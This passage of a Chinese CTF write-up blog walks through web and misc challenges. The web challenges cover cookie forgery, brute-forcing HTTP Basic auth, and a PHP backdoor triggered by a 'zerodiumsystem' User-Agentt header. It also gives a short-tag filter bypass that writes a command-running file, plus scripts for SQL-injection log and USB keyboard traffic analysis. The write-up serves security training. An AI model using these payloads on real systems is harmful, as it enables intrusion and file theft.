challenge-9661cba9e188a4c8.sandbox.ctfhub.com:10080/index.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329162918897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><p>HTTP临时重定向<br><img src="https://img-blog.csdnimg.cn/20210329202651177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>点击超链接无反应，查看源码发现了index.php，而此时url栏是index.html<br><img src="https://img-blog.csdnimg.cn/20210329202712652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>burpsite抓包，在响应包得到flag<br><img src="https://img-blog.csdnimg.cn/20210329202803184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>方法二：<br>curl命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i http://challenge-f6959bd27c1b2b09.sandbox.ctfhub.com:10080/index.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329161745105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl命令<br>https://blog.csdn.net/qq_45738111/article/details/105265455<br></code></pre></td></tr></table></figure><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookie欺骗、认证、伪造</p><p><a href="http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080/">http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080</a><br>方法一：</p><p>抓包，响应头提示只有admin才能得到flag，此时请求头Cookie的值为admin=0<br><img src="https://img-blog.csdnimg.cn/20210329200457714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>改为admin=1，得到flag<br><img src="https://img-blog.csdnimg.cn/20210329200506541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>方法二：</p><p>可以使用curl命令的”-H”参数来为http请求头添加cookie键值来发送cookie：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i -H <span class="hljs-string">&quot;Cookie:admin=1&quot;</span> http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080/<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329191357125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a>基础认证</h2><p>在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 <a href="https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81">https://zh.wikipedia.org/wiki/HTTP基本认证</a></p><p>访问题目地址<br><img src="https://img-blog.csdnimg.cn/20210329192024754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>跳转到登陆页面<br><img src="https://img-blog.csdnimg.cn/2021032919204261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>先输入弱密码admin\123456登陆，然后抓包<br><img src="https://img-blog.csdnimg.cn/20210329192830793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在请求头发现一段base64编码，解码得到<code>admin:123456</code>，而在响应头发现一段话Do u know admin ?，再结合题目附件中给的字典，所以说本题应该是爆破管理员密码，与以往爆破密码不同的是，账号和密码一起被base64加密了。</p><p>将请求报文发送到Intruder，点击Add，将 Basic 后面 base64 部分添加为 payload position<br><img src="https://img-blog.csdnimg.cn/20210329193459133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在Payload Options模块中点击load添加字典，在Payload Processing模块中点击添加选择Add prefix，其值为<code>admin:</code>,继续选择encode，其值为base64-encode，最后点击Start attck开始爆破<br><img src="https://img-blog.csdnimg.cn/20210329194328455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆破结果按Length排序，发现值为<code>YWRtaW46MTIzMzIx</code>，此时状态码为200，说明是正确的账号密码。<br><img src="https://img-blog.csdnimg.cn/20210329194425899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>base64解密得到<code>admin:123321</code>,输入账号密码登陆得到flag，在响应头也能看到flag<br><img src="https://img-blog.csdnimg.cn/20210329194850620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="响应包源代码"><a href="#响应包源代码" class="headerlink" title="响应包源代码"></a>响应包源代码</h2><p>HTTP响应包源代码查看</p><p>访问题目地址<br><img src="https://img-blog.csdnimg.cn/20210329195659368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>抓包，发包，在响应包源码发现了flag。<br><img src="https://img-blog.csdnimg.cn/20210329195714758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接查看源代码也可以发现flag<br><img src="https://img-blog.csdnimg.cn/20210329195946922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>参考:<br><a href="https://baike.baidu.com/item/http/243074?fromtitle=HTTP">百度百科-HTTP协议</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>协议基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虎符+红明谷+ctfshow渔人杯赛后复现</title>
    <link href="/2021/04/05/%E8%99%8E%E7%AC%A6-%E7%BA%A2%E6%98%8E%E8%B0%B7-ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/04/05/%E8%99%8E%E7%AC%A6-%E7%BA%A2%E6%98%8E%E8%B0%B7-ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>摘要：记录最近几场比赛的赛后复现</p> <a id="more"></a><h1 id="虎符CTF"><a href="#虎符CTF" class="headerlink" title="虎符CTF"></a>虎符CTF</h1><h2 id="Web-签到"><a href="#Web-签到" class="headerlink" title="Web-签到"></a>Web-签到</h2><p><img src="https://img-blog.csdnimg.cn/20210404100847899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>参考<a href="http://cn-sec.com/archives/313267.html">详细分析PHP源代码后门事件及其供应链安全启示</a></p><p>根据文章提示，添加恶意请求头</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumphpinfo();<br></code></pre></td></tr></table></figure><p>可以看到phpinfo内容<br><img src="https://img-blog.csdnimg.cn/20210404100629750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续构造，查看根目录下的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumsystem(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404100940524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>读取flag文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumsystem(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404101127186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="MISC-你会日志分析吗"><a href="#MISC-你会日志分析吗" class="headerlink" title="MISC-你会日志分析吗"></a>MISC-你会日志分析吗</h2><p><img src="https://img-blog.csdnimg.cn/20210404101326722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>分析日志，该日志应该是用脚本进行布尔盲注，最后一步是爆flag的值，发现有两种长度的包，猜测长度377代表爆值成功，长度399代表失败<br><img src="https://img-blog.csdnimg.cn/20210404103342703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>列出长度为377的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">90 109 120 104 90 51 116 90 98 51 86 102 89 88 74 108 88 51 78 118 88 50 100 121 90 87 70 48 102 81 61 61<br></code></pre></td></tr></table></figure><p>使用脚本进行处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>a=[<span class="hljs-number">90</span>,<span class="hljs-number">109</span>,<span class="hljs-number">120</span>,<span class="hljs-number">104</span>,<span class="hljs-number">90</span>,<span class="hljs-number">51</span>,<span class="hljs-number">116</span>,<span class="hljs-number">90</span>,<span class="hljs-number">98</span>,<span class="hljs-number">51</span>,<span class="hljs-number">86</span>,<span class="hljs-number">102</span>,<span class="hljs-number">89</span>,<span class="hljs-number">88</span>,<span class="hljs-number">74</span>,<span class="hljs-number">108</span>,<span class="hljs-number">88</span>,<span class="hljs-number">51</span>,<span class="hljs-number">78</span>,<span class="hljs-number">118</span>,<span class="hljs-number">88</span>,<span class="hljs-number">50</span>,<span class="hljs-number">100</span>,<span class="hljs-number">121</span>,<span class="hljs-number">90</span>,<span class="hljs-number">87</span>,<span class="hljs-number">70</span>,<span class="hljs-number">48</span>,<span class="hljs-number">102</span>,<span class="hljs-number">81</span>,<span class="hljs-number">61</span>,<span class="hljs-number">61</span>]<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    flag=flag+<span class="hljs-built_in">chr</span>(i)<br>    <br>print(flag)<br>print(base64.b64decode(flag))<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==<br>b<span class="hljs-string">&#x27;flag&#123;You_are_so_great&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>一个一个找长度为377的包太麻烦了，附上大师傅的脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">from base64 import *<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>with open(<span class="hljs-string">&#x27;access.log&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) as f:<br>    lines = f.readlines()<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;select%20flag%20from%20flllag&quot;</span> <span class="hljs-keyword">in</span> line:<br>            packet_len = line[line.find(<span class="hljs-string">&#x27; 200 &#x27;</span>)+5:line.find(<span class="hljs-string">&#x27; &quot;-&quot; &quot;python-requests/2.21.0&quot;&#x27;</span>)]<br>            <span class="hljs-keyword">if</span> packet_len == <span class="hljs-string">&#x27;377&#x27;</span>:<br>                ascii_code = line[line.find(<span class="hljs-string">&#x27;))=&#x27;</span>)+3:line.find(<span class="hljs-string">&#x27;,sleep&#x27;</span>)]<br>                ascii_str = chr(int(ascii_code))<br>                flag += ascii_str<br>            <span class="hljs-keyword">else</span>:<br>                pass<br>        <span class="hljs-keyword">else</span>:<br>            pass<br><br><span class="hljs-built_in">print</span>(b64decode(flag).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><h1 id="红明谷CTF"><a href="#红明谷CTF" class="headerlink" title="红明谷CTF"></a>红明谷CTF</h1><h2 id="Web-write-shell"><a href="#Web-write-shell" class="headerlink" title="Web-write_shell"></a>Web-write_shell</h2><p>没报上名，在BUU上面找到的环境<br><img src="https://img-blog.csdnimg.cn/20210405165110827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>知识点：短标签绕过php过滤</strong></p><blockquote><p>PHP开启短标签即short_open_tag=on时，可以使用<?=$_?>输出变量</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="hljs-variable">$input</span>))&#123;<br>        <span class="hljs-comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$input</span>))&#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$output</span>)&#123;<br>          <span class="hljs-variable">$input</span>[<span class="hljs-variable">$key</span>] = waf(<span class="hljs-variable">$output</span>);<br>      &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$input</span> = check(<span class="hljs-variable">$input</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$dir</span>))&#123;<br>    mkdir(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;pwd&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;upload&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>        waf(<span class="hljs-variable">$data</span>);<br>        file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$dir</span>&quot;</span> . <span class="hljs-string">&quot;index.php&quot;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>审计代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">1、写入文件，但是对<span class="hljs-variable">$data</span>变量进行了过滤<br>2、使用&lt;?=?&gt; 短标签即可绕过php然后输出<br>3、用反引号直接执行命令<br>4、过滤了空格,用%09代替空格<br></code></pre></td></tr></table></figure><p>根据源码，先查看当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?action=<span class="hljs-built_in">pwd</span> <br><span class="hljs-comment">#sandbox/d99081fe929b750e0557f85e6499103f/</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404173216510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>尝试读取根目录下的所有文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?action=upload&amp;data=&lt;?=`cat%09/*`?&gt;<br></code></pre></td></tr></table></figure><p>最后访问<code>/sandbox/d99081fe929b750e0557f85e6499103f/</code>得到flag<br><img src="https://img-blog.csdnimg.cn/20210404173408667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="MISC-我的心是冰冰的"><a href="#MISC-我的心是冰冰的" class="headerlink" title="MISC-我的心是冰冰的"></a>MISC-我的心是冰冰的</h2><p>题目描述：似乎有信息被隐藏了。</p><p>打开rar压缩包文件受损，可能存在RAR伪加密，按照<a href="https://l1near.top/index.php/2021/03/15/97.html#comment-174">L1near师傅的博客</a>，将24字节处的84改为80即可<br><img src="https://img-blog.csdnimg.cn/20210404180245275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解压压缩包得到<br><img src="https://img-blog.csdnimg.cn/20210404180359809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看wp发现是java盲水印</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar BlindWatermark.jar decode -c bingbing.jpg decode.jpg<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210408214553555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>得到口令<code>gnibgnib</code>，解压得到bingbing.pcapng流量包，发现数据是16位，所以是USB键盘流量<br><img src="https://img-blog.csdnimg.cn/20210404201547272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>tshark提取USB流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata &gt; usbdata.txt <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021040418495794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>剔除空行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404185033903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用脚本加上冒号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)==<span class="hljs-number">16</span>: <span class="hljs-comment"># 键盘流量的话len改为16</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404185301518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>通用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">mappings = &#123; <span class="hljs-number">0x04</span>:<span class="hljs-string">&quot;A&quot;</span>,  <span class="hljs-number">0x05</span>:<span class="hljs-string">&quot;B&quot;</span>,  <span class="hljs-number">0x06</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x07</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x08</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-number">0x09</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-number">0x0A</span>:<span class="hljs-string">&quot;G&quot;</span>,  